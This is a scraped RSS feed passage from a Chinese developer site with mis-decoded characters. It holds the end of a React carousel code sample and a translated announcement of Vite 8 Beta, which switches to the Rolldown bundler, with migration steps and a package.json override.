          <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span>
            "<span class="hljs-attr">--track-padding</span>"<span class="hljs-attr">:</span> " <span class="hljs-attr">0</span> <span class="hljs-attr">0</span> <span class="hljs-attr">16px</span>",
          }}
          <span class="hljs-attr">defaultIndex</span>=<span class="hljs-string">{1}</span>
        &gt;</span>
          {items}
        <span class="hljs-tag">&lt;/<span class="hljs-name">Swiper</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">img</span>
          <span class="hljs-attr">width</span>=<span class="hljs-string">{200}</span>
          <span class="hljs-attr">src</span>=<span class="hljs-string">"https://t7.baidu.com/it/u=2621658848,3952322712&amp;fm=193&amp;f=GIF"</span>
        /&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">Space</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">Button</span>
          <span class="hljs-attr">data-html2canvas-ignore</span>
          <span class="hljs-attr">color</span>=<span class="hljs-string">"primary"</span>
          <span class="hljs-attr">fill</span>=<span class="hljs-string">"solid"</span>
          <span class="hljs-attr">onClick</span>=<span class="hljs-string">{saveCanvas}</span>
        &gt;</span>
          download
        <span class="hljs-tag">&lt;/<span class="hljs-name">Button</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">Button</span> <span class="hljs-attr">color</span>=<span class="hljs-string">"primary"</span> <span class="hljs-attr">fill</span>=<span class="hljs-string">"solid"</span>&gt;</span>
          Solid
        <span class="hljs-tag">&lt;/<span class="hljs-name">Button</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">Button</span> <span class="hljs-attr">color</span>=<span class="hljs-string">"primary"</span> <span class="hljs-attr">fill</span>=<span class="hljs-string">"outline"</span>&gt;</span>
          Outline
        <span class="hljs-tag">&lt;/<span class="hljs-name">Button</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">Button</span> <span class="hljs-attr">color</span>=<span class="hljs-string">"primary"</span> <span class="hljs-attr">fill</span>=<span class="hljs-string">"none"</span>&gt;</span>
          None
        <span class="hljs-tag">&lt;/<span class="hljs-name">Button</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">Space</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
};

</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vite 8 Betaï¼šç”± Rolldown é©±åŠ¨çš„ Vite]]></title>    <link>https://juejin.cn/post/7581693431741202495</link>    <guid>https://juejin.cn/post/7581693431741202495</guid>    <pubDate>2025-12-10T02:53:55.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581693431741202495" data-draft-id="7581693431741169727" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vite 8 Betaï¼šç”± Rolldown é©±åŠ¨çš„ Vite"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2025-12-10T02:53:55.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ˜é‡‘å®‰ä¸œå°¼"/> <meta itemprop="url" content="https://juejin.cn/user/1521379823340792"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vite 8 Betaï¼šç”± Rolldown é©±åŠ¨çš„ Vite
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1521379823340792/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ˜é‡‘å®‰ä¸œå°¼
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T02:53:55.000Z" title="Wed Dec 10 2025 02:53:55 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body cache result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>åŸæ–‡ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fvite.dev%2Fblog%2Fannouncing-vite8-beta" target="_blank" title="https://vite.dev/blog/announcing-vite8-beta" ref="nofollow noopener noreferrer">Vite 8 Beta: The Rolldown-powered Vite</a></p>
<p>ä½œè€…ï¼šVite Team</p>
<p>ç¿»è¯‘ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FTUARAN" target="_blank" title="https://github.com/TUARAN" ref="nofollow noopener noreferrer">TUARAN</a></p>
<p>æ¬¢è¿å…³æ³¨ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FTUARAN%2Ffrontend-weekly-digest-cn" target="_blank" title="https://github.com/TUARAN/frontend-weekly-digest-cn" ref="nofollow noopener noreferrer">å‰ç«¯å‘¨åˆŠ</a>ï¼Œæ¯å‘¨æ›´æ–°å›½å¤–è®ºå›çš„å‰ç«¯çƒ­é—¨æ–‡ç« ï¼Œç´§è·Ÿæ—¶äº‹ï¼ŒæŒæ¡å‰ç«¯æŠ€æœ¯åŠ¨æ€ã€‚</p>
</blockquote>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b4b2b91d91f24c3a9536c752035078e8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5o6Y6YeR5a6J5Lic5bC8:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765940035&amp;x-signature=6xaVRnAeFsFPuJ0NpSnr5k8DcIs%3D" alt="Vite 8 Beta Announcement Cover Image" loading="lazy"/></p>
<p><strong>ç®€è¿°</strong>ï¼šç”± Rolldown é©±åŠ¨çš„ Vite 8 é¦–ä¸ª Beta ç‰ˆæœ¬ç°å·²å‘å¸ƒã€‚Vite 8 å¸¦æ¥äº†æ˜¾è‘—æ›´å¿«çš„ç”Ÿäº§æ„å»ºé€Ÿåº¦ï¼Œå¹¶å¼€å¯äº†æœªæ¥æ”¹è¿›çš„å¯èƒ½æ€§ã€‚ä½ å¯ä»¥é€šè¿‡å°† <code>vite</code> å‡çº§åˆ° <code>8.0.0-beta.0</code> ç‰ˆæœ¬å¹¶é˜…è¯»è¿ç§»æŒ‡å—æ¥å°è¯•æ–°ç‰ˆæœ¬ã€‚</p>
<p>æˆ‘ä»¬å¾ˆé«˜å…´å‘å¸ƒ Vite 8 çš„é¦–ä¸ª Beta ç‰ˆæœ¬ã€‚æ­¤ç‰ˆæœ¬ç»Ÿä¸€äº†åº•å±‚å·¥å…·é“¾ï¼Œå¸¦æ¥äº†æ›´å¥½çš„ä¸€è‡´æ€§è¡Œä¸ºï¼Œä»¥åŠæ˜¾è‘—çš„æ„å»ºæ€§èƒ½æå‡ã€‚Vite ç°åœ¨ä½¿ç”¨ Rolldown ä½œä¸ºå…¶æ‰“åŒ…å™¨ï¼Œå–ä»£äº†ä¹‹å‰ esbuild å’Œ Rollup çš„ç»„åˆã€‚</p>
<h2 data-id="heading-0">é¢å‘ Web çš„æ–°æ‰“åŒ…å™¨</h2>
<p>Vite ä¹‹å‰ä¾èµ–ä¸¤ä¸ªæ‰“åŒ…å™¨æ¥æ»¡è¶³å¼€å‘å’Œç”Ÿäº§æ„å»ºçš„ä¸åŒéœ€æ±‚ï¼š</p>
<ul>
<li><strong>esbuild</strong> ç”¨äºå¼€å‘æœŸé—´çš„å¿«é€Ÿç¼–è¯‘</li>
<li><strong>Rollup</strong> ç”¨äºç”Ÿäº§æ„å»ºçš„æ‰“åŒ…ã€åˆ†å—å’Œä¼˜åŒ–</li>
</ul>
<p>è¿™ç§æ–¹æ³•è®© Vite ä¸“æ³¨äºå¼€å‘è€…ä½“éªŒå’Œç¼–æ’ï¼Œè€Œä¸æ˜¯é‡æ–°å‘æ˜è§£æå’Œæ‰“åŒ…ã€‚ç„¶è€Œï¼Œç»´æŠ¤ä¸¤ä¸ªç‹¬ç«‹çš„æ‰“åŒ…ç®¡é“å¼•å…¥äº†ä¸ä¸€è‡´æ€§ï¼šç‹¬ç«‹çš„è½¬æ¢ç®¡é“ã€ä¸åŒçš„æ’ä»¶ç³»ç»Ÿï¼Œä»¥åŠä¸ºäº†ä¿æŒå¼€å‘å’Œç”Ÿäº§ä¹‹é—´æ‰“åŒ…è¡Œä¸ºä¸€è‡´è€Œä¸æ–­å¢åŠ çš„èƒ¶æ°´ä»£ç ã€‚</p>
<p>ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼ŒVoidZero å›¢é˜Ÿæ„å»ºäº† <strong>Rolldown</strong>ï¼Œè¿™æ˜¯ä¸‹ä¸€ä»£æ‰“åŒ…å™¨ï¼Œç›®æ ‡æ˜¯åœ¨ Vite ä¸­ä½¿ç”¨ã€‚å®ƒçš„è®¾è®¡å®—æ—¨æ˜¯ï¼š</p>
<ul>
<li><strong>æ€§èƒ½</strong>ï¼šRolldown ç”¨ Rust ç¼–å†™ï¼Œä»¥åŸç”Ÿé€Ÿåº¦è¿è¡Œã€‚å®ƒè¾¾åˆ°äº† esbuild çš„æ€§èƒ½æ°´å¹³ï¼Œæ¯” Rollup å¿« 10â€“30 å€ã€‚</li>
<li><strong>å…¼å®¹æ€§</strong>ï¼šRolldown æ”¯æŒä¸ Rollup å’Œ Vite ç›¸åŒçš„æ’ä»¶ APIã€‚å¤§å¤šæ•° Vite æ’ä»¶åœ¨ Vite 8 ä¸­å¼€ç®±å³ç”¨ã€‚</li>
<li><strong>æ›´å¤šåŠŸèƒ½</strong>ï¼šRolldown ä¸º Vite è§£é”äº†æ›´å¤šé«˜çº§åŠŸèƒ½ï¼ŒåŒ…æ‹¬å…¨æ‰“åŒ…æ¨¡å¼ï¼ˆfull bundle modeï¼‰ã€æ›´çµæ´»çš„åˆ†å—æ§åˆ¶ã€æ¨¡å—çº§æŒä¹…ç¼“å­˜ã€æ¨¡å—è”é‚¦ï¼ˆModule Federationï¼‰ç­‰ã€‚</li>
</ul>
<h2 data-id="heading-1">ç»Ÿä¸€å·¥å…·é“¾</h2>
<p>Vite æ›´æ¢æ‰“åŒ…å™¨çš„å½±å“ä¸ä»…ä»…åœ¨äºæ€§èƒ½ã€‚æ‰“åŒ…å™¨åˆ©ç”¨äº†è§£æå™¨ã€è§£æå™¨ã€è½¬æ¢å™¨å’Œå‹ç¼©å™¨ã€‚Rolldown ä½¿ç”¨ <strong>Oxc</strong>ï¼ˆå¦ä¸€ä¸ªç”± VoidZero é¢†å¯¼çš„é¡¹ç›®ï¼‰æ¥å®ç°è¿™äº›ç›®çš„ã€‚</p>
<p>è¿™ä½¿å¾— Vite æˆä¸ºç”±åŒä¸€å›¢é˜Ÿç»´æŠ¤çš„ç«¯åˆ°ç«¯å·¥å…·é“¾çš„å…¥å£ç‚¹ï¼šæ„å»ºå·¥å…· (Vite)ã€æ‰“åŒ…å™¨ (Rolldown) å’Œç¼–è¯‘å™¨ (Oxc)ã€‚</p>
<p>è¿™ç§å¯¹é½ç¡®ä¿äº†æ•´ä¸ªæŠ€æœ¯æ ˆçš„è¡Œä¸ºä¸€è‡´æ€§ï¼Œå¹¶å…è®¸æˆ‘ä»¬åœ¨ JavaScript ç»§ç»­æ¼”è¿›æ—¶å¿«é€Ÿé‡‡ç”¨å¹¶ä¸æ–°è¯­è¨€è§„èŒƒä¿æŒä¸€è‡´ã€‚å®ƒè¿˜è§£é”äº†ä»¥å‰ä»…é  Vite æ— æ³•å®ç°çš„å¹¿æ³›æ”¹è¿›ã€‚ä¾‹å¦‚ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ Oxc çš„è¯­ä¹‰åˆ†æåœ¨ Rolldown ä¸­æ‰§è¡Œæ›´å¥½çš„ Tree-shakingã€‚</p>
<h2 data-id="heading-2">Vite å¦‚ä½•è¿ç§»åˆ° Rolldown</h2>
<p>è¿ç§»åˆ°ç”± Rolldown é©±åŠ¨çš„ Vite æ˜¯ä¸€ä¸ªæ ¹æœ¬æ€§çš„å˜åŒ–ã€‚å› æ­¤ï¼Œæˆ‘ä»¬çš„å›¢é˜Ÿé‡‡å–äº†å®¡æ…çš„æ­¥éª¤æ¥å®æ–½å®ƒï¼Œè€Œä¸ç‰ºç‰²ç¨³å®šæ€§æˆ–ç”Ÿæ€ç³»ç»Ÿå…¼å®¹æ€§ã€‚</p>
<p>é¦–å…ˆï¼Œå‘å¸ƒäº†ä¸€ä¸ªç‹¬ç«‹çš„ <code>rolldown-vite</code> åŒ…ä½œä¸ºæŠ€æœ¯é¢„è§ˆã€‚è¿™ä½¿æˆ‘ä»¬èƒ½å¤Ÿåœ¨ä¸å½±å“ Vite ç¨³å®šç‰ˆæœ¬çš„æƒ…å†µä¸‹ä¸æ—©æœŸé‡‡ç”¨è€…åˆä½œã€‚æ—©æœŸé‡‡ç”¨è€…å—ç›Šäº Rolldown çš„æ€§èƒ½æå‡ï¼ŒåŒæ—¶æä¾›äº†å®è´µçš„åé¦ˆã€‚äº®ç‚¹åŒ…æ‹¬ï¼š</p>
<ul>
<li>Linear çš„ç”Ÿäº§æ„å»ºæ—¶é—´ä» 46 ç§’å‡å°‘åˆ° 6 ç§’</li>
<li>Ramp çš„æ„å»ºæ—¶é—´å‡å°‘äº† 57%</li>
<li>Mercedes-Benz.io çš„æ„å»ºæ—¶é—´å‡å°‘äº†é«˜è¾¾ 38%</li>
<li>Beehiiv çš„æ„å»ºæ—¶é—´å‡å°‘äº† 64%</li>
</ul>
<p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å»ºç«‹äº†ä¸€ä¸ªæµ‹è¯•å¥—ä»¶ï¼Œç”¨äºé’ˆå¯¹ <code>rolldown-vite</code> éªŒè¯å…³é”®çš„ Vite æ’ä»¶ã€‚è¿™ä¸ª CI ä»»åŠ¡å¸®åŠ©æˆ‘ä»¬å°½æ—©å‘ç°å›å½’å’Œå…¼å®¹æ€§é—®é¢˜ï¼Œç‰¹åˆ«æ˜¯å¯¹äº SvelteKitã€react-router å’Œ Storybook ç­‰æ¡†æ¶å’Œå…ƒæ¡†æ¶ã€‚</p>
<p>æœ€åï¼Œæˆ‘ä»¬æ„å»ºäº†ä¸€ä¸ªå…¼å®¹å±‚ï¼Œä»¥å¸®åŠ©å¼€å‘è€…ä» Rollup å’Œ esbuild é€‰é¡¹è¿ç§»åˆ°ç›¸åº”çš„ Rolldown é€‰é¡¹ã€‚</p>
<p>ç»“æœæ˜¯ï¼Œæ¯ä¸ªäººéƒ½æœ‰äº†ä¸€æ¡é€šå¾€ Vite 8 çš„å¹³æ»‘è¿ç§»è·¯å¾„ã€‚</p>
<h2 data-id="heading-3">è¿ç§»åˆ° Vite 8 Beta</h2>
<p>ç”±äº Vite 8 è§¦åŠæ ¸å¿ƒæ„å»ºè¡Œä¸ºï¼Œæˆ‘ä»¬ä¸“æ³¨äºä¿æŒé…ç½® API å’Œæ’ä»¶é’©å­ä¸å˜ã€‚æˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ªè¿ç§»æŒ‡å—æ¥å¸®åŠ©ä½ å‡çº§ã€‚</p>
<p>æœ‰ä¸¤ç§å¯ç”¨çš„å‡çº§è·¯å¾„ï¼š</p>
<ol>
<li><strong>ç›´æ¥å‡çº§</strong>ï¼šåœ¨ <code>package.json</code> ä¸­æ›´æ–° <code>vite</code> å¹¶è¿è¡Œé€šå¸¸çš„å¼€å‘å’Œæ„å»ºå‘½ä»¤ã€‚</li>
<li><strong>é€æ­¥è¿ç§»</strong>ï¼šä» Vite 7 è¿ç§»åˆ° <code>rolldown-vite</code> åŒ…ï¼Œç„¶åå†è¿ç§»åˆ° Vite 8ã€‚è¿™å…è®¸ä½ åœ¨ä¸æ›´æ”¹ Vite å…¶ä»–éƒ¨åˆ†çš„æƒ…å†µä¸‹ï¼Œè¯†åˆ«ä»…ä¸ Rolldown ç›¸å…³çš„å…¼å®¹æ€§é—®é¢˜æˆ–æ•…éšœã€‚ï¼ˆæ¨èç”¨äºå¤§å‹æˆ–å¤æ‚é¡¹ç›®ï¼‰</li>
</ol>
<p><strong>é‡è¦æç¤º</strong></p>
<p>å¦‚æœä½ ä¾èµ–ç‰¹å®šçš„ Rollup æˆ– esbuild é€‰é¡¹ï¼Œä½ å¯èƒ½éœ€è¦å¯¹ Vite é…ç½®è¿›è¡Œä¸€äº›è°ƒæ•´ã€‚è¯·å‚é˜…è¿ç§»æŒ‡å—ä»¥è·å–è¯¦ç»†è¯´æ˜å’Œç¤ºä¾‹ã€‚ä¸æ‰€æœ‰éç¨³å®šä¸»è¦ç‰ˆæœ¬ä¸€æ ·ï¼Œå»ºè®®åœ¨å‡çº§åè¿›è¡Œå½»åº•æµ‹è¯•ï¼Œä»¥ç¡®ä¿ä¸€åˆ‡æŒ‰é¢„æœŸå·¥ä½œã€‚è¯·åŠ¡å¿…æŠ¥å‘Šä»»ä½•é—®é¢˜ã€‚</p>
<p>å¦‚æœä½ ä½¿ç”¨çš„æ¡†æ¶æˆ–å·¥å…·å°† Vite ä½œä¸ºä¾èµ–é¡¹ï¼ˆä¾‹å¦‚ Astroã€Nuxt æˆ– Vitestï¼‰ï¼Œä½ å¿…é¡»åœ¨ <code>package.json</code> ä¸­è¦†ç›– <code>vite</code> ä¾èµ–é¡¹ï¼Œæ ¹æ®ä½ çš„åŒ…ç®¡ç†å™¨ï¼Œæ“ä½œç•¥æœ‰ä¸åŒï¼š</p>
<p><strong>npm / Yarn / pnpm / Bun</strong></p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"overrides"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"vite"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"8.0.0-beta.0"</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>æ·»åŠ è¿™äº›è¦†ç›–åï¼Œé‡æ–°å®‰è£…ä¾èµ–é¡¹å¹¶åƒå¾€å¸¸ä¸€æ ·å¯åŠ¨å¼€å‘æœåŠ¡å™¨æˆ–æ„å»ºé¡¹ç›®ã€‚</p>
<h2 data-id="heading-4">Vite 8 çš„å…¶ä»–åŠŸèƒ½</h2>
<p>é™¤äº†æ­è½½ Rolldown ä¹‹å¤–ï¼ŒVite 8 è¿˜å¸¦æ¥äº†ï¼š</p>
<ul>
<li><strong>å†…ç½® tsconfig paths æ”¯æŒ</strong>ï¼šå¼€å‘è€…å¯ä»¥é€šè¿‡å°† <code>resolve.tsconfigPaths</code> è®¾ç½®ä¸º <code>true</code> æ¥å¯ç”¨å®ƒã€‚æ­¤åŠŸèƒ½æœ‰è¾ƒå°çš„æ€§èƒ½å¼€é”€ï¼Œé»˜è®¤ä¸å¯ç”¨ã€‚</li>
<li><strong>emitDecoratorMetadata æ”¯æŒ</strong>ï¼šVite 8 ç°åœ¨å†…ç½®äº†å¯¹ TypeScript <code>emitDecoratorMetadata</code> é€‰é¡¹çš„è‡ªåŠ¨æ”¯æŒã€‚æœ‰å…³æ›´å¤šè¯¦ç»†ä¿¡æ¯ï¼Œè¯·å‚é˜…åŠŸèƒ½é¡µé¢ã€‚</li>
</ul>
<h2 data-id="heading-5">å±•æœ›æœªæ¥</h2>
<p>é€Ÿåº¦ä¸€ç›´æ˜¯ Vite çš„æ ‡å¿—æ€§ç‰¹å¾ã€‚ä¸ Rolldown ä»¥åŠ Oxc çš„é›†æˆæ„å‘³ç€ JavaScript å¼€å‘è€…å°†å—ç›Šäº Rust çš„é€Ÿåº¦ã€‚å‡çº§åˆ° Vite 8 åº”è¯¥ä»…ä»…å› ä¸ºä½¿ç”¨ Rust å°±èƒ½å¸¦æ¥æ€§èƒ½æå‡ã€‚</p>
<p>æˆ‘ä»¬ä¹Ÿä¸ºå³å°†å‘å¸ƒ Vite çš„**å…¨æ‰“åŒ…æ¨¡å¼ï¼ˆFull Bundle Modeï¼‰**æ„Ÿåˆ°å…´å¥‹ï¼Œè¿™å°†æå¤§åœ°æé«˜å¤§å‹é¡¹ç›®çš„ Vite å¼€å‘æœåŠ¡å™¨é€Ÿåº¦ã€‚åˆæ­¥ç»“æœæ˜¾ç¤ºï¼Œå¼€å‘æœåŠ¡å™¨å¯åŠ¨é€Ÿåº¦æé«˜äº† 3 å€ï¼Œå®Œæ•´é‡æ–°åŠ è½½é€Ÿåº¦æé«˜äº† 40%ï¼Œç½‘ç»œè¯·æ±‚å‡å°‘äº† 10 å€ã€‚</p>
<p>Vite çš„å¦ä¸€ä¸ªæ ‡å¿—æ€§ç‰¹å¾æ˜¯æ’ä»¶ç”Ÿæ€ç³»ç»Ÿã€‚æˆ‘ä»¬å¸Œæœ› JavaScript å¼€å‘è€…ç»§ç»­ä½¿ç”¨ä»–ä»¬ç†Ÿæ‚‰çš„ JavaScript è¯­è¨€æ‰©å±•å’Œå®šåˆ¶ Viteï¼ŒåŒæ—¶å—ç›Šäº Rust çš„æ€§èƒ½æå‡ã€‚æˆ‘ä»¬çš„å›¢é˜Ÿæ­£åœ¨ä¸ VoidZero å›¢é˜Ÿåˆä½œï¼ŒåŠ é€Ÿè¿™äº›åŸºäº Rust çš„ç³»ç»Ÿä¸­çš„ JavaScript æ’ä»¶ä½¿ç”¨ã€‚</p>
<p>ç›®å‰å¤„äºå®éªŒé˜¶æ®µçš„å³å°†åˆ°æ¥çš„ä¼˜åŒ–ï¼š</p>
<ul>
<li><strong>åŸå§‹ AST ä¼ è¾“</strong>ï¼šå…è®¸ JavaScript æ’ä»¶ä»¥æœ€å°çš„å¼€é”€è®¿é—® Rust ç”Ÿæˆçš„ ASTã€‚</li>
<li><strong>åŸç”Ÿ MagicString è½¬æ¢</strong>ï¼šç®€å•çš„è‡ªå®šä¹‰è½¬æ¢ï¼Œé€»è¾‘åœ¨ JavaScript ä¸­ï¼Œä½†è®¡ç®—åœ¨ Rust ä¸­ã€‚</li>
</ul>
<h2 data-id="heading-6">è”ç³»æˆ‘ä»¬</h2>
<p>å¦‚æœä½ å°è¯•äº† Vite 8 betaï¼Œæˆ‘ä»¬å¾ˆä¹æ„å¬åˆ°ä½ çš„åé¦ˆï¼è¯·æŠ¥å‘Šä»»ä½•é—®é¢˜æˆ–åˆ†äº«ä½ çš„ç»éªŒï¼š</p>
<ul>
<li><strong>Discord</strong>ï¼šåŠ å…¥æˆ‘ä»¬çš„ç¤¾åŒºæœåŠ¡å™¨è¿›è¡Œå®æ—¶è®¨è®º</li>
<li><strong>GitHub</strong>ï¼šåœ¨ GitHub discussions ä¸Šåˆ†äº«åé¦ˆ</li>
<li><strong>Issues</strong>ï¼šåœ¨ <code>rolldown-vite</code> ä»“åº“æŠ¥å‘Šé”™è¯¯å’Œå›å½’é—®é¢˜</li>
<li><strong>Wins</strong>ï¼šåœ¨ <code>rolldown-vite-perf-wins</code> ä»“åº“åˆ†äº«ä½ æ”¹è¿›çš„æ„å»ºæ—¶é—´</li>
</ul>
